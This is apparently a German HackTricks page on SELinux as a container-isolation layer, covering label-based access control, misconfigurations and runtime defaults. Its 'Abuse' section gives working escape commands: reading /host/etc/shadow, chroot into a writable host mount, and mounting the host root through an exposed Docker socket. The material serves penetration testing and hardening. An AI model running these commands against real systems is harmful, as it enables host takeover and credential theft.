# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

SELinux ist ein **label-basiertes Mandatory Access Control**-System. Jeder relevante Prozess und jedes Objekt kann einen security context tragen, und die Policy entscheidet, welche Domains mit welchen Types und auf welche Weise interagieren dürfen. In containerisierten Umgebungen bedeutet das normalerweise, dass die Runtime den Containerprozess unter einer eingeschränkten container domain startet und den Containerinhalt mit entsprechenden Types labelt. Wenn die Policy richtig funktioniert, kann der Prozess die Dinge lesen und schreiben, die sein Label berühren darf, während ihm der Zugriff auf anderen Host-Content verweigert wird — selbst wenn dieser Content über ein Mount sichtbar wird.

Dies ist eines der mächtigsten host-seitigen Protektionen, die in mainstream Linux-Container-Deployments verfügbar sind. Es ist besonders wichtig auf Fedora, RHEL, CentOS Stream, OpenShift und anderen SELinux-zentrierten Ökosystemen. In solchen Umgebungen wird ein Reviewer, der SELinux ignoriert, oft nicht verstehen, warum ein offensichtlich erscheinender Pfad zur Kompromittierung des Hosts tatsächlich blockiert ist.

## AppArmor Vs SELinux

Der einfachste Unterschied auf hoher Ebene ist, dass AppArmor pfad-basiert ist, während SELinux **label-basiert** ist. Das hat große Konsequenzen für Container-Sicherheit. Eine pfad-basierte Policy kann sich anders verhalten, wenn derselbe Host-Content unter einem unerwarteten Mount-Pfad sichtbar wird. Eine label-basierte Policy fragt stattdessen, welches Label das Objekt hat und was die Prozess-Domain damit tun darf. Das macht SELinux nicht simpel, aber es macht es robust gegenüber einer Klasse von Pfad-Tricks, auf die Verteidiger in AppArmor-basierten Systemen manchmal versehentlich bauen.

Weil das Modell label-orientiert ist, sind der Umgang mit Container-Volumes und Entscheidungen zum Relabeling sicherheitskritisch. Wenn die Runtime oder der Operator Labels zu weitreichend ändert, um "Mounts funktionieren zu lassen", kann die Policy-Grenze, die die Workload eigentlich einkapseln sollte, viel schwächer werden als beabsichtigt.

## Lab

Um zu prüfen, ob SELinux auf dem Host aktiv ist:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Vorhandene Labels auf dem Host anzeigen:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Um einen normalen Durchlauf mit einem zu vergleichen, bei dem labeling deaktiviert ist:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Auf einem SELinux-aktivierten Host ist dies eine sehr praxisnahe Demonstration, weil sie den Unterschied zwischen einer Workload, die unter der erwarteten Container-Domain läuft, und einer, der diese Durchsetzungsebene entzogen wurde, zeigt.

## Runtime Usage

Podman ist besonders gut mit SELinux integriert auf Systemen, bei denen SELinux zur Standardeinstellung der Plattform gehört. Rootless Podman plus SELinux ist eine der stärksten mainstream-Container-Baselines, weil der Prozess auf der Host-Seite bereits unprivilegiert ist und zusätzlich durch eine MAC-Richtlinie eingeschränkt bleibt. Docker kann SELinux dort ebenfalls nutzen, wo es unterstützt wird, obwohl Administratoren es manchmal deaktivieren, um Probleme mit der Volume-Beschriftung zu umgehen. CRI-O und OpenShift bauen stark auf SELinux als Teil ihrer Container-Isolationsstrategie. Kubernetes kann SELinux-bezogene Einstellungen ebenfalls bereitstellen, aber ihr Wert hängt natürlich davon ab, ob das Node-OS SELinux tatsächlich unterstützt und durchsetzt.

Die wiederkehrende Lehre ist, dass SELinux keine optionale Garnitur ist. In den Ökosystemen, die darum herum aufgebaut sind, ist es Teil der erwarteten Sicherheitsgrenze.

## Misconfigurations

Der klassische Fehler ist `label=disable`. Operativ entsteht das häufig, weil ein Volume-Mount verweigert wurde und die schnellste kurzfristige Lösung darin bestand, SELinux aus der Gleichung zu entfernen, anstatt das Labeling-Modell zu reparieren. Ein weiterer häufiger Fehler ist fehlerhaftes Relabeling von Host-Inhalten. Breite Relabel-Operationen können die Anwendung funktionsfähig machen, aber sie können auch erweitern, was der Container anfassen darf, weit über das ursprünglich Beabsichtigte hinaus.

Es ist außerdem wichtig, **installiertes** SELinux nicht mit **effektivem** SELinux zu verwechseln. Ein Host kann SELinux unterstützen und trotzdem im permissive-Modus sein, oder der Runtime startet die Workload nicht unter der erwarteten Domain. In diesen Fällen ist der Schutz deutlich schwächer, als die Dokumentation vermuten lässt.

## Abuse

Wenn SELinux fehlt, permissiv ist oder für die Workload großflächig deaktiviert wurde, werden hostgemountete Pfade viel leichter ausnutzbar. Derselbe Bind-Mount, der sonst durch Labels eingeschränkt wäre, kann zu einem direkten Zugang zu Host-Daten oder Host-Modifikationen werden. Das ist besonders relevant in Kombination mit beschreibbaren Volume-Mounts, Container-Runtime-Verzeichnissen oder operativen Abkürzungen, die sensible Host-Pfade aus Bequemlichkeit offenlegen.

SELinux erklärt oft, warum ein generisches Breakout-Writeup auf einem Host sofort funktioniert, auf einem anderen aber wiederholt fehlschlägt, selbst wenn die Runtime-Flags ähnlich aussehen. Die fehlende Zutat ist häufig überhaupt kein Namespace oder eine Capability, sondern eine Label-Grenze, die intakt geblieben ist.

Der schnellste praktische Check ist, den aktiven Kontext zu vergleichen und dann gemountete Host-Pfade oder Runtime-Verzeichnisse zu prüfen, die normalerweise durch Labels eingeschränkt wären:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Wenn ein host bind mount vorhanden ist und SELinux-Labeling deaktiviert oder abgeschwächt wurde, tritt häufig zuerst eine Informationsoffenlegung auf:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Wenn das mount schreibbar ist und der container aus Sicht des kernel faktisch host-root ist, ist der nächste Schritt, kontrollierte host-Änderungen zu testen, statt zu raten:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Auf SELinux-fähigen Hosts kann das Verlieren von Labels in Laufzeit-Statusverzeichnissen auch direkte privilege-escalation-Pfade offenlegen:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Diese Befehle ersetzen keine vollständige Escape-Kette, machen aber sehr schnell klar, ob SELinux den Zugriff auf Host-Daten oder Dateiänderungen auf der Host-Seite verhindert hat.

### Vollständiges Beispiel: SELinux deaktiviert + beschreibbarer Host-Mount

Wenn SELinux-Labeling deaktiviert ist und das Host-Dateisystem bei `/host` als beschreibbar gemountet ist, wird ein vollständiger Host-Escape zu einem normalen Fall von bind-mount-Missbrauch:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn der `chroot` erfolgreich ist, läuft der Container-Prozess nun im Host-Dateisystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Vollständiges Beispiel: SELinux deaktiviert + Runtime Directory

Wenn die Workload einen Runtime-Socket erreichen kann, nachdem Labels deaktiviert wurden, kann der Escape an den Runtime delegiert werden:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante Beobachtung ist, dass SELinux häufig die Kontrolle war, die genau diese Art von host-path- oder runtime-state-Zugriff verhinderte.

## Checks

Das Ziel der SELinux-Prüfungen ist es zu bestätigen, dass SELinux aktiviert ist, den aktuellen security context zu identifizieren und festzustellen, ob die Dateien oder Pfade, die Sie interessieren, tatsächlich label-confined sind.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Was hier interessant ist:

- `getenforce` sollte idealerweise `Enforcing` zurückgeben; `Permissive` oder `Disabled` ändern die Bedeutung des gesamten SELinux-Abschnitts.
- Wenn der aktuelle Prozesskontext unerwartet oder zu breit erscheint, läuft die Workload möglicherweise nicht unter der vorgesehenen Container-Policy.
- Wenn host-mounted files oder runtime directories Labels haben, auf die der Prozess zu frei zugreifen kann, werden bind mounts deutlich gefährlicher.

Beim Prüfen eines Containers auf einer SELinux-fähigen Plattform sollte die Kennzeichnung nicht als sekundäres Detail behandelt werden. In vielen Fällen ist sie einer der Hauptgründe, warum der Host noch nicht kompromittiert ist.

## Laufzeit-Standardwerte

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux-Standardeinstellungen sind stärker distributionsabhängig als seccomp-Defaults. Auf Fedora/RHEL/OpenShift-style Systemen ist SELinux oft zentral für das Isolationsmodell. Auf Systemen ohne SELinux ist es schlicht nicht vorhanden.
